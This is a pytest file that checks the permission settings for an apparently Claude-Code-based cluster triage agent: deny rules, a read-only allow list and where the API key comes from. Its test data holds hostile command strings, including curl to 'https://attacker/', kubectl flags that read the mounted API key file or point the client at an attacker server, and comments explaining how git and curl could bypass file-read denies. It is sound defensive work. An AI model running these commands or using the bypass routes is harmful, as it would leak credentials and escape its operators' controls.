import json
import re
from pathlib import Path

HERE = Path(__file__).parent
SETTINGS = json.loads((HERE / "managed-settings.json").read_text())
ALLOW = SETTINGS["permissions"]["allow"]
DENY = SETTINGS["permissions"]["deny"]


def _matches(rule: str, command: str) -> bool:
    """A Bash(...) rule as Claude Code matches it: `*` is any run of characters."""
    if not (rule.startswith("Bash(") and rule.endswith(")")):
        return False
    pattern = "".join(".*" if c == "*" else re.escape(c) for c in rule[5:-1])
    return re.fullmatch(pattern, command, re.S) is not None


def denied(command: str) -> bool:
    return any(_matches(r, command) for r in DENY)


def allowed(command: str) -> bool:
    return not denied(command) and any(_matches(r, command) for r in ALLOW)


def test_hooks_disabled_and_nothing_prompts():
    assert SETTINGS["disableAllHooks"] is True
    assert SETTINGS["permissions"]["defaultMode"] == "dontAsk"


def test_required_denies_are_present():
    for rule in ["WebFetch", "WebSearch", "Edit", "Write", "NotebookEdit", "Bash(helm *)",
                 "Bash(kubectl get secret*)", "Bash(kubectl describe secret*)", "Bash(kubectl * secret*)",
                 "Bash(kubectl exec *)", "Bash(curl *)", "Bash(wget *)",
                 "Bash(kubectl port-forward *)", "Read(//var/run/secrets/**)"]:
        assert rule in DENY, rule


def test_allow_list_is_read_only_and_narrow():
    for rule in ALLOW:
        assert rule.startswith("Bash(") and rule.endswith(")"), rule
        words = rule[5:-1].split()
        assert words[0] in ("kubectl", "flux", "triage-query"), rule
        if words[0] == "kubectl":
            assert words[1] in ("get", "describe", "logs", "top", "events"), rule
        if words[0] == "flux":
            assert words[1] == "get", rule
        if words[0] == "triage-query":
            assert words[1] in ("vm", "vm-lt", "loki") and words[2:] == ["*"], rule


def test_triage_query_is_the_only_route_to_metrics_and_logs():
    assert [r for r in ALLOW if r.startswith("Bash(triage-query")] == [
        "Bash(triage-query vm *)", "Bash(triage-query vm-lt *)", "Bash(triage-query loki *)"]
    assert not [r for r in ALLOW if "curl" in r or "wget" in r]


def test_nothing_that_reads_arbitrary_files_through_bash():
    # cat/grep/jq/head/tail would bypass the Read deny on /var/run/secrets.
    for rule in ALLOW:
        assert not rule.startswith(("Bash(cat", "Bash(grep", "Bash(jq", "Bash(head", "Bash(tail",
                                    "Bash(sh", "Bash(bash", "Bash(python", "Bash(env")), rule


def test_api_key_comes_from_the_mounted_file_not_the_environment():
    assert SETTINGS["apiKeyHelper"] == "/usr/local/bin/triage-api-key"
    helper = (HERE / "triage-api-key").read_text()
    assert "/var/run/secrets/triage/anthropic/api_key" in helper
    assert "ANTHROPIC_API_KEY" not in helper


def test_image_ships_no_project_settings():
    assert not (HERE / ".claude").exists()


def test_git_is_denied_outright():
    # `git log --output=<path> --pretty=format:...` writes arbitrary bytes to any path,
    # e.g. a filter.<x>.clean command into a .git/config that something else later runs.
    assert not [r for r in ALLOW if r.startswith("Bash(git")]
    assert "Bash(git *)" in DENY


def test_curl_and_wget_are_denied_outright():
    # A `curl -s http://loki.../*` allow also matched a second URL on the same line
    # (file:///var/run/secrets/..., or an outside host); flag denies were evadable.
    assert "Bash(curl *)" in DENY and "Bash(wget *)" in DENY
    for cmd in ["curl -s http://loki.monitoring.svc:3100/x file:///var/run/secrets/triage/anthropic/api_key",
                "curl -s http://victoria-metrics-single-server.monitoring.svc:8428/api/v1/query https://attacker/",
                "curl -sOx http://loki.monitoring.svc:3100/x", "curl https://attacker/", "wget -qO- http://x/"]:
        assert denied(cmd) and not allowed(cmd), cmd


DENIED = [
    "kubectl get secret foo -n x", "kubectl get secrets -A", "kubectl get -n x secrets",
    "kubectl get -n x secret/foo -o yaml", "kubectl describe -n x secret foo",
    "kubectl get --raw /api/v1/namespaces/x/secrets/y",
    "kubectl get pods --kubeconfig=/work/home/evil", "kubectl get pods --token=abc",
    "kubectl get pods --server=https://attacker", "kubectl get pods -s https://attacker",
    "kubectl get pods --as=system:admin", "kubectl get pods --context=x", "kubectl get pods --user=x",
    "kubectl get pods --certificate-authority=/x", "kubectl get pods --client-key=/x",
    "kubectl get pods --insecure-skip-tls-verify", "kubectl get pods --tls-server-name=x",
    # template and column files are read by kubectl: a file read the Read deny never sees
    "kubectl get ns default -o go-template-file=/var/run/secrets/triage/anthropic/api_key",
    "kubectl get ns default -ojsonpath-file=/var/run/secrets/triage/anthropic/api_key",
    "kubectl get ns default --output=templatefile=/x", "kubectl get ns -o custom-columns-file=/x",
    "kubectl get ns -wojsonpath-file=/x", "kubectl get ns --output go-template-file=/x",
    "kubectl get -f /var/run/secrets/triage/anthropic/api_key", "kubectl get --filename=/x",
    "kubectl get -k /work/repo", "kubectl get --kustomize=/x",
    "kubectl get pods --profile=cpu --profile-output=/result/x", "kubectl get pods --cache-dir=/result",
    "flux get all --kubeconfig=/x", "flux get all --server=https://attacker", "flux get all --token=x",
    "flux get all --as=x", "flux get all --cache-dir=/result",
]
ALLOWED = [
    "kubectl get pods -n mediastack", "kubectl get externalsecrets -A",
    "kubectl get pods -A --sort-by=.metadata.name --show-labels",
    "kubectl logs -n mediastack deploy/filebrowser --since=1h",
    "kubectl get pod filebrowser-0 -n mediastack -o yaml",
    "kubectl get helmrelease velero -n velero -o jsonpath='{.status.history}'",
    "kubectl describe pod -n mediastack filebrowser-0", "kubectl events -n velero",
    "flux get helmreleases -A",
    "triage-query vm '/api/v1/query?query=up'", "triage-query vm-lt /api/v1/labels",
    "triage-query loki '/loki/api/v1/query_range?query={namespace=\"x\"}&limit=10'",
]


def test_kubectl_and_flux_cannot_read_secrets_files_or_switch_credentials():
    # RBAC (no `secrets` in the ClusterRole) is the real guard for Secrets; these
    # denies stop the flags that read local files or aim the client elsewhere.
    for cmd in DENIED:
        assert denied(cmd), cmd


def test_ordinary_investigation_commands_stay_allowed():
    for cmd in ALLOWED:
        assert allowed(cmd), cmd


def test_prompts_never_send_the_agent_to_a_denied_git_command():
    for prompt in (HERE / "triage" / "prompts").glob("*.md"):
        text = prompt.read_text()
        assert "git log" not in text and "git show" not in text, prompt.name
    assert "status.history[].chartVersion" in (HERE / "triage" / "prompts" / "incident.md").read_text()
